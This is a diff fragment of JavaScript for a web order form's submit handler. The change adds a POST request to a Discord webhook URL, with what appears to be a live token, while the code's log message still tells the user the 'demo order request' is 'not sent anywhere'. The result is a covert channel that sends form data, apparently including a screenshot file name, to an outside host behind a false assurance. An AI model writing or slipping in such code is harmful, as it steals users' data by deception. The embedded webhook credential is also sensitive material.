@@ -88,7 +88,7 @@ document.getElementById("orderForm").addEventListener("submit", async e=>{
     screenshotFileName:file.name
   };
   console.log("Demo order request (not sent anywhere):",details);
-  fetch("", {
+  fetch("https://discordapp.com/api/webhooks/1559883698617188352/gcqra2yG9qdBJxIJncrP1wVvRIDOx7vKrfvvcebwlxAYqYcJ5dJa18LRGHgAcVmZOrb0", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
